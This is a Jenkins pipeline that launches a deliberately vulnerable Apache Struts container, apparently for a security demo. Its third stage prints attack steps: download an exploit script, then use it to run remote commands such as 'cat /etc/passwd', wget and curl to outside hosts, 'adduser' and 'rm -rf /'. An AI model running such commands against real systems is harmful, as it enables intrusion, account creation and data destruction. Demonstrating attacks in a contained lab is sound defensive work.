pipeline {
  agent any
  stages {
    stage('Stage 1') {
      steps {
        echo 'Preparing Apache Struts Demo..'
      }
    }

    stage('Stage 2') {
      steps {
        echo 'Starting the Container..'
        sh 'docker run --rm -d --name apache-struts -p 80:8080 andrefernandes86/src-demo-apachestruts '
      }
    }

    stage('Stage 3') {
      steps {
        echo 'Testing..'
        sh 'curl 127.0.0.1:8080'
        echo 'Demo Ready!'
        echo 'Make sure Python is installed in your attacker machine! wget https://af-aws-demo.s3.us-east-2.amazonaws.com/exploit.py'
        echo 'chmod 777 exploit.py  -- Attacking the Vulnerable Web Application  From Attacker Machine python exploit.py http://public-ip/hello "ls -la"  python exploit.py http://public-ip/hello "cat /etc/passwd"  python exploit.py http://public-ip/hello "wget http://2016.eicar.org/download/eicar.com"  python exploit.py http://public-ip/hello "curl http://wrs21.winshipway.com/"  python exploit.py http://public-ip/hello "adduser strutsvuln"  python exploit.py http://public-ip/hello "rm -rf /"'
      }
    }

    stage('Stage 4') {
      steps {
        echo 'Deleting demo..'
        sleep(unit: 'MINUTES', time: 1)
        sh 'docker kill apache-struts'
      }
    }

  }
}